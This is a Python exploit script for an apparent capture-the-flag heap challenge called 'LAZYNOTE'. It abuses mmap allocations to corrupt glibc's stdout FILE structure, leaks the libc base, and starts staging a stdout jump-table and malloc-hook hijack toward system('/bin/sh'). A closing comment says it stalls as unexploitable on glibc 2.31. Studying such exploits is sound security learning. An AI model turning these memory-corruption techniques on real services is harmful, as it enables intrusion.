import socket
import sys
from time import sleep
from struct import pack, unpack

from utils import _is_int, to_bytes, from_bytes, rol
from roputils import *
from logger import Logger

# NOTE: code inspired by https://faraz.faith/2020-10-13-FSOP-lazynote/ writeup

logger = Logger("LAZYNOTE")

SERVER_ADDR = ('localhost', 8889)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER_ADDR)

def get_libc_path():
    with open("libcpath", "r") as f:
        return f.read()[:-1]

def get_payload_offsets():
    with open("libcdata_woffset.bin", "rb") as f:
        return f.read()

DELAY = 0.05

def alloc(asize, rsize, content, rec):

    logger.log_info(f"allocating chunk: asize {hex(asize)}, rsize: {hex(rsize)}")

    sock.send(b'1\x00\n')

    if type(content) is str:
        content = content.encode()

    sleep(DELAY)

    if rec:
        sock.recv(1024)

    sock.send(f"{asize}".encode() + b'\x00\n')

    sleep(DELAY)
    
    if rec:
        sock.recv(1024)
        
    sock.send(f"{rsize}".encode() + b'\x00\n')

    sleep(DELAY)

    assert(len(content) == min(asize, rsize) - 1 or content[-1] == ord('\n'))

    if rec:
        sock.recv(1024)
        
    sock.send(content)

    return None

def command_stream():

    # ASLR, canary, FIE, full RELRO

    MMAP_THRESH = 0x200000

    # mmap is (at least currently, and relative to other addresses) deterministic
    # it will serve the chunk with the highest address possible
    # (but lower than the end of ld's region - 
    #   which I suspect, is closely related to mm_struct->mmap_base)
    # for the current process, the only gap in memory large enough for 
    # a 0x20000 allocation is between the end of the heap and the base of libc
    # and the allocation being top-down, the allocated chunk will be right before libc

    # ===== leak libc base =====

    # overwrite stdout read_end and stdout write_base LSB with \x00
    # to trick libc in thinking output is buffered
    # it will return part of stdout file struct, which contain libc addresses (stdin file address more precisely)

    STDOUT_READ_END_OFFSET = 0x1ec6b0        # from libc base
    STDOUT_WRITE_BASE_OFFSET = 0x1ec6c0      # from libc base
    STDIN_FILE_PLUS_OFFSET = 0x1eb980        # from libc base

    sock.recv(1024)

    input()

    alloc(MMAP_THRESH, STDOUT_READ_END_OFFSET + MMAP_THRESH + 0xff0 + 0x1, b'A' * (MMAP_THRESH - 1), rec = True)
    alloc(MMAP_THRESH, STDOUT_WRITE_BASE_OFFSET + MMAP_THRESH + 0xff0 + 0x1 + MMAP_THRESH + 0x1000, b'A' * (MMAP_THRESH - 1), rec = False)
    
    leaked_stdin_addr = from_bytes(sock.recv(1024)[8:16])
    libc_base_addr = leaked_stdin_addr - STDIN_FILE_PLUS_OFFSET

    logger.log_info(f"libc base leaked: {hex(libc_base_addr)}")

    #input()

    # ===== hijack stdout jump table and malloc hook =====

    BINSH_OFFSET = 0x1b75aa         # from libc base
    SYSTEM_OFFSET = 0x55410         # from libc base
    STDIN_BUF_END_OFFSET = 0x1eb9c0 # from libc base

    # next offsets relative to stdin cur_column

    MALLOC_HOOK_OFFSET = 0x160
    STDOUT_WRITEPTR_OFFSET = 0xcc8
    STDOUT_WRITEBASE_OFFSET = 0xcc0
    STDOUT_BUFBASE_OFFSET = 0xcd8
    STDOUT_BUFEND_OFFSET = 0xce0
    STDOUT_JUMPTABLE_PTR_OFFSET = 0xd78
    IO_STR_JUMPS_OFFSET = 0x1b60

    SMALLOFFSET = 0x3

    alloc(MMAP_THRESH, STDIN_BUF_END_OFFSET + 0x5 + MMAP_THRESH + 0xff0 + 0x1 + 2 * (MMAP_THRESH + 0x1000), b'A' * (MMAP_THRESH - 1), rec = True)

    # then I realised I cannot continue de exploit
    # verdict: unexploitable on glibc 2.31

    input()

if __name__ == "__main__":
    command_stream()
